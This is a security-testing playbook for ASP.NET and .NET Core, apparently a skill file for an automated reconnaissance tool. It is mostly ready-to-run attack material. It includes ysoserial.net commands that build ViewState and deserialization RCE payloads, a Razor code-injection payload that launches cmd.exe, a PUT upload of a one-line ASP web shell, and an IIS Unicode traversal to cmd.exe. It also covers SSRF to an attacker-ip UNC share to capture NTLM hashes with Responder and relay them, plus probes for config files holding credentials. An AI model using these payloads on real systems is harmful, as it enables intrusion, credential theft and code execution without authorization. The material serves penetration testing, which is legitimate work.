<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: dotnet
description: Security testing playbook for ASP.NET / .NET Core applications covering ViewState deserialization, Razor SSTI, NTLM auth bypass, IIS misconfigurations, and .NET-specific attack techniques
---

# ASP.NET / .NET Core Security Testing

.NET is dominant in enterprise environments. Attack surface: ViewState deserialization (RCE without auth if machineKey is weak), Razor SSTI, NTLM credential capture, IIS misconfigurations, and .NET-specific deserialization gadget chains.

---

## Reconnaissance

### Fingerprinting ASP.NET

    # Response headers (often reveal framework and version)
    X-Powered-By: ASP.NET
    X-AspNet-Version: 4.0.30319
    X-AspNetMvc-Version: 5.2

    # ASP.NET Core (newer):
    # No X-Powered-By by default, but:
    # Server: Microsoft-IIS/10.0  → IIS = likely .NET
    # .aspx, .ashx, .asmx file extensions

    # Common .NET paths:
    GET /elmah.axd              # Error log viewer (CRITICAL if exposed)
    GET /trace.axd              # ASP.NET trace viewer (request details)
    GET /ScriptResource.axd     # Script resource handler
    GET /WebResource.axd        # Web resource handler
    GET /api/                   # ASP.NET Core Web API
    GET /swagger/               # Swagger UI
    GET /swagger/index.html
    GET /_framework/blazor.server.js    # Blazor server-side
    GET /signalr/               # SignalR WebSocket hub
    GET /hangfire               # Hangfire job dashboard
    GET /health                 # Health check endpoint
    GET /metrics                # Prometheus metrics

    # Webconfig exposure (CRITICAL if accessible):
    GET /web.config             # ASP.NET configuration (connection strings, machineKey)
    GET /web.config.bak
    GET /appsettings.json       # .NET Core config
    GET /appsettings.Development.json
    GET /appsettings.Production.json

---

## ViewState Deserialization (ASP.NET WebForms)

ViewState is base64-encoded state stored in `__VIEWSTATE` hidden field. If MAC validation is disabled or machineKey is weak → RCE.

    # Step 1: Check if MAC validation is enabled:
    # Extract __VIEWSTATE from page source
    # Try sending request with modified __VIEWSTATE — if accepted = MAC validation off

    # Step 2: If machineKey is in web.config (leaked):
    <machineKey validationKey="AAAA..." decryptionKey="BBBB..." validation="SHA1" decryption="AES" />

    # Step 3: Generate RCE payload using ysoserial.net:
    # https://github.com/pwntester/ysoserial.net

    # ViewState payload (MAC enabled, needs machineKey):
    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami > C:\windows\temp\out.txt" \
      --validationalg="SHA1" --validationkey="AAAA..." --decryptionalg="AES" \
      --decryptionkey="BBBB..." --islegacy

    # ViewState payload (MAC disabled):
    ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --islegacy --isdebug

    # Submit crafted __VIEWSTATE in POST body

    # Find machineKey in common locations:
    GET /web.config
    GET /App_Data/web.config
    # Or via SSRF/LFI

---

## .NET Deserialization

    # Generate gadget chain payloads with ysoserial.net:
    # Windows: ysoserial.exe | Linux: mono ysoserial.exe

    # Available formatters: BinaryFormatter, LosFormatter, ObjectStateFormatter,
    #                       NetDataContractSerializer, SoapFormatter, XML, JSON

    # BinaryFormatter gadget (most common):
    ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami"
    ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "cmd /c whoami"

    # JSON.NET deserialization (common in Web API):
    ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "cmd /c whoami"
    # Payload injected into any JSON field that accepts polymorphic objects

    # SOAP/ASMX endpoints:
    ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -o base64 -c "cmd /c whoami"

    # Detect deserialization: look for AAEAAAD/ prefix in base64 = BinaryFormatter
    # Look for binary data in cookies, hidden fields, API responses

---

## Razor SSTI (ASP.NET MVC / Razor Pages)

    # Razor is not a template engine in the traditional sense
    # But if user input reaches @Html.Raw() or dynamic template rendering:

    # Detection probes (Razor expressions):
    @(7*7)                      # Outputs 49
    @{var x=7*7;}@x             # Also outputs 49

    # If Razor code injection (very rare, needs unsanitized eval):
    @{System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\temp\\out.txt")}

    # More common: XSS via @Html.Raw():
    @Html.Raw(userInput)        # XSS if input not sanitized
    # vs safe: @userInput or @Html.Encode(userInput)

    # Blazor Server-Side: check WebSocket for exposed component state

---

## NTLM Authentication Attacks

IIS with Windows Authentication exposes NTLM hashes:

    # Detect NTLM auth:
    curl -I <target>
    # WWW-Authenticate: NTLM → NTLM auth enabled
    # WWW-Authenticate: Negotiate → Kerberos/NTLM

    # Capture NTLM hash via Responder (if SSRF → internal NTLM auth endpoint):
    responder -I eth0

    # Trigger SSRF to internal Windows share → NTLM capture:
    POST /ssrf-endpoint
    url=\\\\attacker-ip\\share

    # NTLM relay attack (if SSRF to internal UNC path):
    impacket-ntlmrelayx -tf targets.txt -smb2support

    # Identify NTLM-authenticated endpoints:
    curl -v http://<target>/auth-endpoint 2>&1 | grep -i "NTLM\|Negotiate\|401"

---

## IIS Misconfigurations

    # Short filename enumeration (IIS 6.x legacy):
    # IIS creates 8.3 short filenames accessible via tilde (~)
    GET /backup~1/       # Tests if backup directory exists
    GET /web~1.con       # web.config short name

    # IIS scanner tools:
    # https://github.com/irsdl/IIS-ShortName-Scanner
    java -jar iis_shortname_scanner.jar 2 20 http://<target>/

    # HTTP methods exposure:
    OPTIONS /  HTTP/1.1   # Check for PUT, DELETE, TRACE
    # PUT enabled = arbitrary file upload to web root

    # IIS PUT file upload (rare but still found):
    curl -X PUT <target>/shell.asp --data "<%eval request(chr(35))%>"

    # WebDAV (if enabled):
    curl -X PROPFIND <target>/ -H "Depth: 1"

    # IIS Unicode bypass (old IIS 4/5):
    GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir

    # ASP Classic file extensions:
    GET /default.asp
    GET /index.asp
    GET /admin.asp

---

## Elmah / Diagnostic Endpoints

    # ELMAH (Error Logging Modules and Handlers) — extremely common exposure
    GET /elmah.axd                      # Error log with full exception details
    GET /elmah.axd?asyncMode=true
    GET /elmah.axd?type=download        # Download entire error log

    # elmah.axd reveals:
    # - Connection strings (db passwords)
    # - Full stack traces with variable values
    # - Internal IP addresses, file paths
    # - Request data including cookies, POST bodies

    # Other diagnostic endpoints:
    GET /trace.axd                      # Full request trace (headers, session, form data)
    GET /diagnostics
    GET /admin/diagnostics

---

## appsettings.json Exposure (.NET Core)

    # .NET Core config files (JSON, not XML)
    GET /appsettings.json
    GET /appsettings.Development.json
    GET /appsettings.Staging.json

    # Contents: connection strings, JWT secrets, API keys, service URLs
    {
      "ConnectionStrings": {
        "DefaultConnection": "Server=...;Password=..."
      },
      "Jwt": {
        "Secret": "super_secret_key_here"
      }
    }

---

## SignalR / WebSocket

    # SignalR hub endpoints:
    GET /signalr/negotiate?clientProtocol=1.5&connectionData=...
    ws://<target>/signalr?...

    # Hub method injection (if input reflected in hub method name):
    # SignalR hubs may have authorization gaps — test all hub methods

    # Blazor Server: client ↔ server circuit communication via WebSocket
    # All component state transmitted — check for IDOR in component parameters

---

## Entity Framework SQL Injection

    # EF Core parameterizes by default, but raw queries exist:

    # Vulnerable:
    context.Database.ExecuteSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'")
    context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Id = {id}")

    # Safe:
    context.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Id = {id}")
    context.Database.ExecuteSqlInterpolated($"DELETE FROM Users WHERE Id = {id}")

    # LINQ injection via dynamic expressions (rare):
    # If using Dynamic LINQ library with user-controlled sort/filter strings

---

## Common CVEs

| CVE | Product | Impact |
|-----|---------|--------|
| CVE-2019-0604 | SharePoint | RCE via deserialization |
| CVE-2021-31166 | IIS HTTP.sys | RCE (remote heap overflow) |
| CVE-2017-9248 | Telerik UI | Crypto bypass → file upload |
| CVE-2019-18935 | Telerik UI | RCE via deserialization |
| CVE-2014-6287 | HFS (HTTP File Server) | RCE |

    # Telerik Reporting / UI for ASP.NET (extremely common):
    GET /Telerik.Web.UI.WebResource.axd?type=rau    # Check version
    # CVE-2019-18935: Deserialize via RadAsyncUpload
    nuclei -t cves/2019/CVE-2019-18935.yaml -u <target>

---

## Pro Tips

1. `elmah.axd` exposed = instant critical — reveals connection strings, cookies, full errors
2. ViewState MAC validation off (check via `EnableEventValidation=false`) = RCE with ysoserial.net
3. `machineKey` in `web.config` + ViewState = RCE even with MAC validation enabled
4. `appsettings.json` exposure is the .NET Core equivalent of Laravel's `.env`
5. NTLM via SSRF: force SSRF to `\\attacker\share` → capture NTLMv2 hash via Responder
6. Telerik UI RadAsyncUpload (CVE-2019-18935) is common in corporate ASP.NET apps — always check
7. IIS short filename tilde enumeration reveals hidden directories/files on Windows IIS

## Summary

ASP.NET testing = `elmah.axd` exposure + ViewState deserialization (ysoserial.net) + appsettings.json/web.config + NTLM auth capture. elmah.axd is the fastest critical win — it dumps the entire application error log including connection strings. ViewState RCE requires the machineKey (from web.config exposure) or MAC validation being disabled — ysoserial.net handles the payload generation. Telerik UI components are extremely common and have multiple critical CVEs — always fingerprint and check.
